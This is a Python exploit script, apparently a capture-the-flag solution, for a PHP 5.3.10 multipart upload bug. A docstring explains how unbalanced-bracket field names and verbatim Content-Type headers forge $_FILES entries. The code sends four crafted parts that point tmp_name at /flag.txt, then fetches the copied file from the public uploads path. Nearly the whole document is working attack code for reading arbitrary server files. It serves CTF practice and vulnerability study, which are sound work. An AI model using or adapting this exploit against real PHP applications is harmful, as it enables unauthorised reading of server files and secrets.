#!/usr/bin/env python3
"""
01 - Corrupting upload file indices (PHP 5.3.10, main/rfc1867.c).

PHP builds the $_FILES keys for an array upload field with

    snprintf(lbuf, llen, "%s[tmp_name][%s]", abuf, array_index);   /* name ends in ] */
    snprintf(lbuf, llen, "%s[tmp_name]",     param);               /* it does not     */

`is_arr_upload` is only true when the field name *ends* with ']'. Up to and
including PHP 5.3.10 the parser accepted names with unbalanced brackets, so a
name such as `file[tmp_name][` takes the second branch: the property name is
appended *after* the attacker's own index instead of being the first key.

    name="file[tmp_name]["   ->   $_FILES[file][tmp_name][ [name     ] = <filename>
                                  $_FILES[file][tmp_name][ [type     ] = <Content-Type>
                                  $_FILES[file][tmp_name][ [tmp_name ] = /tmp/phpXXXX
                                  $_FILES[file][tmp_name][ [error    ] = 0
                                  $_FILES[file][tmp_name][ [size     ] = <bytes>

The `[type` slot carries the part's Content-Type header verbatim - it is not
run through basename() the way `filename=` is - so four parts are enough to
forge a complete, fully attacker-controlled row of the $_FILES structure:

    $_FILES[file][tmp_name][ [type ] = /flag.txt     <- the "temp file"
    $_FILES[file][name]    [ [type ] = loot.png      <- passes the extension check
    $_FILES[file][size]    [ [type ] = 1024          <- passes the size check
    $_FILES[file][error]   [ [type ] = 0             <- UPLOAD_ERR_OK

PixelDrop's batch intake path iterates $_FILES['file']['tmp_name'] and calls
copy() instead of move_uploaded_file(), so it happily copies /flag.txt into
the public gallery.

Original research: Adam Iwaniuk, "Overriding $_FILES array during uploading
multiple files in php" (2011).
"""

import re
import sys
import urllib.error
import urllib.request

BOUNDARY = "----PixelDropBatch"
LOOT = "loot.png"


def part(name, filename, content_type, body=b"x"):
    """One multipart/form-data file part with a fully controlled Content-Type."""
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n"
        f"\r\n"
    )
    return head.encode() + body + b"\r\n"


def build_body(target_file, loot_name):
    parts = [
        # $_FILES['file']['tmp_name']['[type'] = <path we want the app to read>
        part("file[tmp_name][", "pad", target_file),
        # $_FILES['file']['name']['[type']     = destination name, must pass the whitelist
        part("file[name][", "pad", loot_name),
        # $_FILES['file']['size']['[type']     = a size inside the allowed range
        part("file[size][", "pad", "1024"),
        # $_FILES['file']['error']['[type']    = UPLOAD_ERR_OK
        part("file[error][", "pad", "0"),
    ]
    return b"".join(parts) + f"--{BOUNDARY}--\r\n".encode()


def post(base, body):
    req = urllib.request.Request(
        base + "/",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode("utf-8", "replace")


def get(base, path):
    req = urllib.request.Request(base + path)
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode("utf-8", "replace")


def main():
    base = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge").rstrip("/")

    print(f"[*] target                : {base}")
    print("[*] forging a $_FILES row with four unbalanced-bracket upload parts")
    print("      file[tmp_name][  Content-Type: /flag.txt")
    print(f"      file[name][      Content-Type: {LOOT}")
    print("      file[size][      Content-Type: 1024")
    print("      file[error][     Content-Type: 0")

    try:
        page = post(base, build_body("/flag.txt", LOOT))
    except urllib.error.URLError as exc:
        print(f"[-] POST failed: {exc}", file=sys.stderr)
        return 1

    for line in re.findall(r'<li class="rep">(.*?)</li>', page, re.S):
        print("[+] intake report        :", line.strip())

    if f"stored as uploads/{LOOT}" not in page:
        print("[-] the batch path did not store our forged entry", file=sys.stderr)
        print(page, file=sys.stderr)
        return 1

    print(f"[*] fetching /uploads/{LOOT}")
    try:
        loot = get(base, f"/uploads/{LOOT}")
    except urllib.error.URLError as exc:
        print(f"[-] GET failed: {exc}", file=sys.stderr)
        return 1

    match = re.search(r"PHRACK\{[^}]*\}", loot)
    if not match:
        print("[-] no flag in the copied file:", repr(loot[:200]), file=sys.stderr)
        return 1

    print(f"FLAG: {match.group(0)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
